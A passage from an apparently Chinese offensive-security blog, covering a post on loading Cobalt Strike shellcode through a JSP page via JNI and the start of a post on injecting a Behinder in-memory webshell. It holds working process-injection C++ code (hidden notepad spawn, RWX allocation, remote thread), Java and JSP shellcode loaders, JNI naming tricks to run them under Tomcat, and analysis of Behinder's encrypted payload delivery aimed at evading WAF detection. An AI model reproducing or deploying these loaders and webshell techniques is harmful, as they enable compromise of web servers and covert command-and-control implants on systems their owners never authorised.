<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105171507598.png" alt="image-20210105171507598"></p>
<p>​        再将这三个头文件导入到项目中</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105171711628.png" alt="image-20210105171711628"></p>
<p>​        在jni.h中，主要包含一些类型的定义和函数的声明，如下所示：</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105173642399.png" alt="image-20210105173642399"></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105173708526.png" alt="image-20210105173708526"></p>
<p>​        在jin_md.h中，主要是对一些关键字声明</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105173938940.png" alt="image-20210105173938940"></p>
<p>​        在Hello.h提示找不到jni.h，这里需要将&lt;&gt;改为“”</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105174702474.png" alt="image-20210105174702474"></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210105174824808.png" alt="image-20210105174824808"></p>
<p><strong>编写testHello函数</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"test666.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Hello.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_Hello_testHello</span><span class="params">(JNIEnv*, jobject)</span> </span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is C++ print"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        JNIEXPORT的定义为<code>#define JNIEXPORT __declspec(dllexport)</code>,<code>__declspec(dllexport)</code>用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，也就是将这个函数声明为导出函数，供其他函数调用。 JNICALL的定义为__stdcall，代表系统调用。JNIEnv_是一个封装了几乎全部 JNI 方法的一个结构体。使用的函数名为Hello.h中定义的函数名。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106094104524.png" alt="image-20210106094104524"></p>
<p>​        使用x64编译好后，会生成一个DLL文件</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106095459727.png" alt="image-20210106095459727"></p>
<p>​        在IDEA中 VM options选项中设置路径DLL文件绝对路径<code>-Djava.library.path=C:\xxx\xxx\source\repos\JNI_Dll\x64\Release</code>    </p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106100237210.png" alt="image-20210106100237210"></p>
<p>​        即可正常运行JNI函数。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106100447172.png" alt="image-20210106100447172"></p>
<p>​        也可以使用<code>System.load(&quot;C:\\xxxx\\xxxx\\source\\repos\\JNI_Dll\\x64\\Release\\JNI_Dll.dll&quot;);</code>的方式加载DLL并执行其中的导出函数。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106100923974.png" alt="image-20210106100923974"></p>
<h3 id="如何调试JNI"><a href="#如何调试JNI" class="headerlink" title="如何调试JNI?"></a>如何调试JNI?</h3><p>​        在使用JNI时，由于DLL无法独立运行，遇到错误不方便调试，所以需要了解下如何调试JNI。</p>
<p>​        首先以Debug模式运行JAVA项目，并在调用JNI函数时打上断点。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102327645.png" alt="image-20210106102327645"></p>
<p>​        使用JAVA自带的工具jps找到运行当前类所对应的进程ID</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102413186.png" alt="image-20210106102413186"></p>
<p>​        在vs中在需要调试的函数处打断点，选择<code>调试-》附加到进程-》找到需要调试的类的进程</code></p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102543581.png" alt="image-20210106102543581"></p>
<p>​        附加到进程后，在JAVA中执行步过，即可运行到JNI函数处。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106102714754.png" alt="image-20210106102714754"></p>
<h3 id="如何利用JNI加载shellcode"><a href="#如何利用JNI加载shellcode" class="headerlink" title="如何利用JNI加载shellcode?"></a>如何利用JNI加载shellcode?</h3><p>​        首先编写java文件，调用native层的函数inject，并传入shellcode。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">byte</span>[] me)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; (<span class="keyword">byte</span>)<span class="number">0xfc</span>, (<span class="keyword">byte</span>)<span class="number">0x48</span>, (<span class="keyword">byte</span>)<span class="number">0x83</span>, (<span class="keyword">byte</span>)<span class="number">0xe4</span>, (<span class="keyword">byte</span>)<span class="number">0xf0</span>, (<span class="keyword">byte</span>)<span class="number">0xe8</span>, (<span class="keyword">byte</span>)<span class="number">0xc8</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x51</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x50</span>, &#125;; <span class="comment">//生成的java类型的shellcode</span></span><br><span class="line">        System.load(<span class="string">"C:\\xxx\\xx\\xxx\\JNI_Dll.dll"</span>);</span><br><span class="line">        Hello jniDemo = <span class="keyword">new</span> Hello();</span><br><span class="line">        jniDemo.inject(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编写C++文件,分配内存并将shellcode加载到内存。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"test666.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Hello.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(LPCVOID <span class="built_in">buffer</span>, <span class="keyword">int</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_Hello_inject</span><span class="params">(JNIEnv * env, jobject object, jbyteArray jdata)</span></span>&#123;</span><br><span class="line">	jbyte* data = env-&gt;GetByteArrayElements(jdata, <span class="number">0</span>);</span><br><span class="line">	jsize length = env-&gt;GetArrayLength(jdata);</span><br><span class="line">	inject((LPCVOID)data,(SIZE_T)length);</span><br><span class="line">	env-&gt;ReleaseByteArrayElements(jdata, data, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(LPCVOID <span class="built_in">buffer</span>, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T wrote;</span><br><span class="line">    LPVOID ptr;</span><br><span class="line">    <span class="keyword">char</span> lbuffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">char</span> cmdbuff[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reset some stuff */</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* start a process */</span></span><br><span class="line">    GetStartupInfo(&amp;si);</span><br><span class="line">    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.hStdOutput = <span class="literal">NULL</span>;</span><br><span class="line">    si.hStdError = <span class="literal">NULL</span>;</span><br><span class="line">    si.hStdInput = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolve windir? */</span></span><br><span class="line">    GetEnvironmentVariableA(<span class="string">"windir"</span>, lbuffer, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* setup our path... choose wisely for 32bit and 64bit platforms */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IS64_</span></span><br><span class="line">    _snprintf(cmdbuff, <span class="number">1024</span>, <span class="string">"%s\\SysWOW64\\notepad.exe"</span>, lbuffer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    _snprintf(cmdbuff, <span class="number">1024</span>, <span class="string">"%s\\System32\\notepad.exe"</span>, lbuffer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spawn the process, baby! */</span></span><br><span class="line">    <span class="keyword">if</span>(!CreateProcessA(<span class="literal">NULL</span>, cmdbuff, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    hProcess = pi.hProcess;</span><br><span class="line">    <span class="keyword">if</span> (!hProcess)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* allocate memory in our process */</span></span><br><span class="line">    ptr = (LPVOID)VirtualAllocEx(hProcess, <span class="number">0</span>, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write our shellcode to the process */</span></span><br><span class="line">    WriteProcessMemory(hProcess, (LPTHREAD_START_ROUTINE)ptr, <span class="built_in">buffer</span>, (SIZE_T)length, (SIZE_T*)&amp;wrote);</span><br><span class="line">    <span class="keyword">if</span> (wrote != length)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create a thread in the process */</span></span><br><span class="line">    CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,(LPTHREAD_START_ROUTINE)ptr, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        执行java文件，加载shellcode上线</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106141335054.png" alt="image-20210106141335054"></p>
<p>​        但当我把这个java代码改为jsp脚本在tomcat上执行却会报错,即使将JNI函数中的内容清空仍然会报这个错。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106160224472.png" alt="image-20210106160224472"></p>
<p>​        但是这个代码在JAVA中运行却没有问题，为什么在写JSP在tomcat下运行就会有问题，之前我们了解过JNI函数的调用和函数名有关系，JNI函数的函数名必须为<code>JAVA_包名_类名_函数名</code>这种形式，而JSP脚本本身是无法运行的，在tomcat中会将jsp脚本转化为java再编译为class文件运行。而生成的这个JAVA文件是以org.apache.jsp为包名，文件名_jsp为类名运行的。经过这层转变JNI函数中的函数名已经不符合要求了，自然无法成功调用。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106160759454.png" alt="image-20210106160759454"></p>
<p>​        所以我们声明的类文件必须再<code>org.apache.jsp</code>包下，并且外部类的类名应该为文件名_jsp，我们需要调用的JNI函数应该定义再内部类中,我这里假如我想使用test.jsp文件加载shellcode上线。首先写一个java文件内容如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.jsp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test_jsp</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">JniClass</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">byte</span>[] me)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        使用javac编译该文件，会生成两个class类文件。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106161604711.png" alt="image-20210106161604711"></p>
<p>​        因为要调用的JNI函数是写在内部类中，所以需要以内部类生成一个头文件,将目录切换到src目录下，执行<code>javah org.apache.jsp.test_jsp$JniClass</code>生成需要的头文件。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106161810624.png" alt="image-20210106161810624"></p>
<p>​        将生成的<code>org.apache.jsp.test_jsp$JniClass.h</code>放到C++的项目目录下,再添加到头文件中</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106162256764.png" alt="image-20210106162256764"></p>
<p>​        最后编写test.cpp文件，内容如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jni.h"</span></span></span><br><span class="line"><span class="comment">/* Header for class org_apache_jsp_test_jsp_JniClass */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _Included_org_apache_jsp_test_jsp_JniClass</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _Included_org_apache_jsp_test_jsp_JniClass</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     org_apache_jsp_test_jsp_JniClass</span></span><br><span class="line"><span class="comment"> * Method:    inject</span></span><br><span class="line"><span class="comment"> * Signature: ([B)V</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT <span class="keyword">void</span> JNICALL Java_org_apache_jsp_test_1jsp_00024JniClass_inject</span><br><span class="line">  (JNIEnv *, jobject, jbyteArray);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>​        编写test.jsp，内容如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JniClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">byte</span>[] me)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; (<span class="keyword">byte</span>)<span class="number">0xfc</span>, (<span class="keyword">byte</span>)<span class="number">0x48</span>, (<span class="keyword">byte</span>)<span class="number">0x83</span>, (<span class="keyword">byte</span>)<span class="number">0xe4</span>, (<span class="keyword">byte</span>)<span class="number">0xf0</span>, (<span class="keyword">byte</span>)<span class="number">0xe8</span>, (<span class="keyword">byte</span>)<span class="number">0xc8</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x00</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x51</span>, (<span class="keyword">byte</span>)<span class="number">0x41</span>, (<span class="keyword">byte</span>)<span class="number">0x50</span>, (<span class="keyword">byte</span>)<span class="number">0x52</span>, (<span class="keyword">byte</span>)<span class="number">0x51</span>, (<span class="keyword">byte</span>)<span class="number">0x56</span>, (<span class="keyword">byte</span>)<span class="number">0x48</span>, (<span class="keyword">byte</span>)<span class="number">0x31</span>,xxx &#125;;<span class="comment">// JAVA SHELLCODE </span></span><br><span class="line"></span><br><span class="line">System.load(<span class="string">"C:\\XXX\\XXX\\XXX\\JNI_Dll.dll"</span>);</span><br><span class="line">JniClass jniDemo = <span class="keyword">new</span> JniClass();</span><br><span class="line">jniDemo.inject(buf);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​            访问jsp即可上线。</p>
<p><img src="/2021/01/05/jsp%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDshellcode%E4%B8%8A%E7%BA%BFcobaltstrike%E5%AE%9E%E7%8E%B0/image-20210106174003896.png" alt="image-20210106174003896"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">注入冰蝎内存马实现</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-04 16:39:53" itemprop="dateCreated datePublished" datetime="2021-01-04T16:39:53+08:00">2021-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-05 13:37:48" itemprop="dateModified" datetime="2021-01-05T13:37:48+08:00">2021-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过之前的文章，我们了解了servlet和filter类型的内存马的实现，但是实现的是cmd马，在实战的过程中会有两个问题。1.不方便操作使用.2.比较难过WAF的查杀。本片文章我先解决一下第一个问题，将冰蝎马注入到内存。</p>
<h2 id="冰蝎马实现"><a href="#冰蝎马实现" class="headerlink" title="冰蝎马实现"></a>冰蝎马实现</h2><h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>​         由于静态分析比较麻烦，所以我选择直接debug调试，这里感谢<code>https://github.com/Freakboy/Behinder</code>给出了可以直接运行的冰蝎3.0源码，有了源码可以方便调试并且根据需求对冰蝎进行二次开发。</p>
<h4 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h4><pre><code>我选择了文件上传的操作来分析冰蝎的执行过程，上传操作由vip.youwe.sheller.ui.controller.FileManagerViewController#uploadFile实现，首先获取的需要上传的文件名，再通过`Utils.getFileData(selectdFile.getAbsolutePath())`获取需要上传的内容，最后通过` this.currentShellService.uploadFile(currentPath + fileName, fileContent);`执行真正的上传逻辑。 </code></pre><p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104200400375.png" alt="image-20210104200400375"></p>
<p>​        创建LinkedHashMap，将mode、path、content的内容分别赋值为create、远程文件地址、文件内容,调用<code>Utils.getData(this.currentKey, this.encryptType, &quot;FileOperation&quot;, params, this.currentType);</code></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104201133062.png" alt="image-20210104201133062"></p>
<p>​        在vip.youwe.sheller.utils.Utils#getData(java.lang.String, int, java.lang.String, java.util.Map&lt;java.lang.String,java.lang.String&gt;, java.lang.String, byte[])中首先判断type是否为jsp，设置了classname为<code>vip.youwe.sheller.payload.java.FileOperation</code>,调用了<code>Params.getParamedClass(className, params);</code></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104202236081.png" alt="image-20210104202236081"></p>
<p>​        vip.youwe.sheller.core.Params#getParamedClass通过ASM修改字节码的方式修改<code>vip.youwe.sheller.payload.java.FileOperation</code>字节码，对其中的mode、path、content属性进行修改，并将修改后的class字节码转换为byte[]返回。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104202457148.png" alt="image-20210104202457148"></p>
<p>​        getParamedClass执行结束后，调用<code>Crypt.Encrypt(bincls, key)</code>对返回的字节码进行AES加密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104203932657.png" alt="image-20210104203932657"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204209133.png" alt="image-20210104204209133"></p>
<p>​            将AES加密的FileOperation字节码通过base64编码，再转换为byte[]返回。</p>
